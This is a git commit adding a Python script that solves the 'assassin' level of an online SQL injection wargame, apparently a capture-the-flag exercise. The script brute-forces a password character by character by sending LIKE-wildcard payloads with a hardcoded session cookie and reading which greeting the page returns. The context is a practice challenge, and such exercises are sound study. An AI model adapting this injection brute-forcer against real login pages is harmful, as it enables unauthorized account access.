c001def55a44cd214593d3f68918143f60900537
thisisyoobi <thisisyoobi@gmail.com>
2022-06-02 14:21:27 +0900

    add assassin

---
+++ LOS/15-assassin.py
@@ -0,0 +1,23 @@
+import requests
+import string
+
+header = {"Cookie": "PHPSESSID=eir9opar1tmb15lmh931grquf3;"}
+url = "https://los.rubiya.kr/chall/assassin_14a1fd552c61c60f034879e5d4171373.php"
+string_data = string.digits + string.ascii_letters
+
+print(string_data)
+
+password = ""
+guest_pw = ""
+
+# find password length
+while True:
+    for i in string_data:
+        data = "?pw={}%".format(guest_pw+i)
+        response = requests.get(url + data, headers=header)
+        if response.text.find("Hello admin") != -1:
+            print("[+] Hello admin : " + str(guest_pw+i) + "%")
+            exit()
+        if response.text.find("Hello guest") != -1:
+            print("[+] Hello guest : " + str(guest_pw+i) + "%")
+            guest_pw += i
